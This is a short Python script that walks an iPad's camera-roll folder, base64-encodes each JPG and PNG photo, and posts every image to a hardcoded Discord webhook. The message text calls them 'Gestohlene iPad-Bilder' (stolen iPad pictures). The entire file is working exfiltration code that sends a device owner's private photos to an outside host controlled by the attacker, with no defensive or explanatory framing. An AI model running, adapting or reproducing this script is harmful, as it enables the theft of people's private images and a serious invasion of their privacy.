import os
import requests
import base64

webhook = "https://discord.com/api/webhooks/1515522768085712948/q6-BJUR-Pn7liVsI4fiE-vrer-0Wn_fwS1kU2ZhFQB3rM3Ib6ZrK622yu7bWmsClEsCY"
photo_path = "/var/mobile/Media/DCIM/"

for root, dirs, files in os.walk(photo_path):
    for file in files:
        if file.endswith(('.jpg', '.png')):
            with open(os.path.join(root, file), "rb") as img:
                encoded = base64.b64encode(img.read()).decode()
                data = {"content": f"Gestohlene iPad-Bilder: {file}", "embeds": [{"image": {"url": f"data:image/jpeg;base64,{encoded}"}}]}
                requests.post(webhook, json=data)
